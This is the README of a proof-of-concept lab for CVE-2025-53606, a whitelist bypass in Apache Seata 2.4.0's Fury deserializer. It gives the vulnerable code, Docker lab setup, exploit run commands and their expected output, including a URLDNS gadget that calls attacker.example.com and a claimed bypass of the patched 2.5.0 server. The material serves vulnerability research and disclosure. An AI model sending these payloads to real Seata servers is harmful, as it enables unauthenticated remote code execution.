# CVE-2025-53606: Apache Seata Fury Deserializer Whitelist Bypass (RCE)

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-53606 |
| **Affected Software** | Apache Seata (incubating) — Fury Serializer component |
| **Affected Versions** | 2.4.0 (`org.apache.seata:seata-serializer-fury:2.4.0`) |
| **Patched Version** | 2.5.0 |
| **CVSS** | 9.8 CRITICAL — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **Author** | [Exploit Intelligence Platform](https://exploit-intel.com) |

## Overview

Apache Seata (incubating) v2.4.0 contains a critical deserialization vulnerability in the Fury serializer component (`seata-serializer-fury`). The `FurySerializerFactory` class implements a class whitelist checker using a lambda that returns a boolean value, but Apache Fury's `ClassResolver.loadClass()` **ignores the return value** — it only blocks deserialization if the checker **throws an exception**. Since the lambda never throws, all classes pass validation regardless of whitelist membership, enabling remote unauthenticated attackers to deserialize arbitrary Java classes via the Seata RPC protocol (TCP port 8091) and potentially achieve Remote Code Execution (RCE).

## Root Cause

The vulnerability is in `FurySerializerFactory.java` (line 42). The Fury serializer is configured with `requireClassRegistration(false)`, which allows any class to be deserialized. A custom `ClassChecker` lambda is set to enforce a whitelist, but it has a fatal flaw:

```java
// VULNERABLE CODE — FurySerializerFactory.java (Seata 2.4.0)
f.getClassResolver().setClassChecker(
    (classResolver, className) ->
        SerializerSecurityRegistry.getAllowClassPattern().contains(className)
);
```

**The ClassChecker contract**: The `ClassChecker` interface declares a `boolean checkClass()` return type, but Fury's `ClassResolver.loadClass()` calls the checker as a **void statement** — it discards the return value. The **only** mechanism to block a class is to **throw an exception** (specifically `InsecureException`). The lambda returns `false` for non-whitelisted classes but never throws — so Fury proceeds to load and deserialize the class unconditionally.

### Attack Surface

- **Entry Point**: Seata RPC port TCP 8091 (Netty-based, no authentication)
- **Serializer Selection**: Attacker-controlled via codec byte `0x56` in the RPC message header
- **Protocol**: Seata RPC v1 binary protocol (magic `0xDADA`)
- **JDK**: Server runs JDK 8u422 (Temurin) — JNDI remote class loading is enabled by default

## Lab Setup

### Prerequisites

- Docker Engine with Docker Compose plugin

### Start the Lab

```bash
docker compose up -d
```

### Lab Containers

| Container | Image | Role | Host Ports |
|---|---|---|---|
| `cve-2025-53606-vulnerable` | `apache/seata-server:2.4.0` | Vulnerable Seata server (broken ClassChecker) | 7091 (HTTP), 8091 (RPC) |
| `cve-2025-53606-patched` | `apache/seata-server:2.5.0` | Patched Seata server (AllowListChecker STRICT) | 7092 (HTTP), 8092 (RPC) |

### Verify Lab Health

```bash
# Check container status
docker compose ps

# Verify vulnerable server health
curl -sf http://localhost:7091/health
# Expected: "ok"
```

### Stop the Lab

```bash
docker compose down
```

## PoC Usage

### Files

| File | Description |
|---|---|
| `poc/poc.py` | Network exploit — sends Fury payloads via Seata RPC v1 protocol |
| `poc/poc_vector2.py` | Direct ClassChecker bypass test — JVM-level comparison |
| `poc/bypass_poc.py` | AllowListChecker pre-registration bypass (tests patched server) |
| `poc/PayloadGenerator.java` | Java source for Fury payload generation |
| `poc/ClassCheckerBypassTest.java` | Java source for ClassChecker comparison test |
| `poc/fury-core-0.8.0.jar` | Apache Fury library (same version as server) |

### Vector 1: Network Exploit (`poc.py`)

Sends three Fury-serialized payloads over the Seata RPC v1 binary protocol to TCP port 8091:

1. `java.io.File` — non-whitelisted JDK class
2. `LinkedHashMap` with `File` + `AtomicInteger` values — non-whitelisted value types
3. `HashMap<URL, String>` — DNS callback gadget (`URL.hashCode=-1` triggers DNS resolution)

**Dependencies**: Python 3.6+ (stdlib only)

```bash
# Run PoC against vulnerable server
python3 poc/poc.py localhost 8091 cve-2025-53606-vulnerable
```

**Expected output (vulnerable server):**
```
========================================================================
CVE-2025-53606: Apache Seata Fury Deserializer Whitelist Bypass
========================================================================
Target: localhost:8091

[*] Testing payload: file
    Description: java.io.File("/etc/passwd") — non-whitelisted JDK class
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!

[*] Testing payload: hashmap_mixed
    Description: LinkedHashMap with File + AtomicInteger values
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!

[*] Testing payload: urldns
    Description: HashMap<URL, String> DNS callback (URL.hashCode=-1)
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!

========================================================================
RESULTS SUMMARY
========================================================================
  [✓ VULNERABLE] file
  [✓ VULNERABLE] hashmap_mixed
  [✓ VULNERABLE] urldns

[+] CVE-2025-53606 CONFIRMED: 3/3 payloads bypassed the Fury ClassChecker whitelist
[+] EXPLOITATION SUCCESSFUL — CVE-2025-53606 confirmed
```

### Vector 2: Direct ClassChecker Bypass (`poc_vector2.py`)

Runs a Java test inside the vulnerable container that directly compares the broken lambda ClassChecker against the fixed AllowListChecker within the same JVM.

```bash
python3 poc/poc_vector2.py cve-2025-53606-vulnerable
```

### Bypass PoC: AllowListChecker Pre-Registration Bypass (`bypass_poc.py`)

Tests the **patched** server (Seata 2.5.0) and demonstrates that 36 non-whitelisted Java classes bypass the AllowListChecker because Fury pre-registers built-in serializers during initialization. See `bypass_analysis.md` for full details.

```bash
python3 poc/bypass_poc.py localhost 8092 cve-2025-53606-patched
```

## Verification: Vulnerable vs. Patched

| Evidence | Vulnerable (2.4.0) | Patched (2.5.0) |
|---|---|---|
| Fury instance created | Yes | Yes |
| URL codec compiled (`URLFuryRefCodecCompatible_0`) | Yes | No |
| Attacker URL appears in server body | Yes (`attacker.example.com`) | No |
| HashMap populated with attacker content | Yes (`{http://attacker.example.com/...=exploit}`) | No (empty `{}`) |
| `URL.hashCode()` triggered (DNS callback) | Yes (hashCode changed from `-1`) | No |
| `InsecureException` thrown | No (never thrown — broken checker) | Yes (AllowListChecker blocks) |
| Non-whitelisted class deserialized | Yes (`URL`, `AtomicInteger`, `File`) | No (all blocked) |

## Fix

**Commit**: [`d2a18aef`](https://github.com/apache/incubator-seata/commit/d2a18aef82c08535e4134642070c39d98654f0f6) | **PR**: [#7498](https://github.com/apache/incubator-seata/pull/7498)

The fix replaces the broken lambda-based ClassChecker with Fury's built-in `AllowListChecker`:

```java
// AFTER (fixed — Seata 2.5.0):
AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
f.getClassResolver().setClassChecker(checker);
checker.allowClasses(SerializerSecurityRegistry.getAllowClassPattern());
```

### Recommended Mitigations

1. **Upgrade to Seata >= 2.5.0** — This is the definitive fix
2. **Network segmentation** — Restrict access to TCP port 8091 (Seata RPC) to trusted clients only
3. **Disable Fury serializer** — If not required, remove `seata-serializer-fury` from the classpath

## References

| Resource | URL |
|---|---|
| **GHSA Advisory** | https://github.com/advisories/GHSA-g358-g2pq-c46j |
| **Apache Mailing List** | https://lists.apache.org/thread/ggfd72vvvxjozs81zbcls45zxg64pphx |
| **Fix PR** | https://github.com/apache/incubator-seata/pull/7498 |
| **Fix Commit** | https://github.com/apache/incubator-seata/commit/d2a18aef82c08535e4134642070c39d98654f0f6 |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2025-53606 |

## Disclaimer

This proof-of-concept is provided for **authorized security testing, education, and research purposes only**. Do not use against systems without explicit written authorization. The authors assume no liability for misuse.
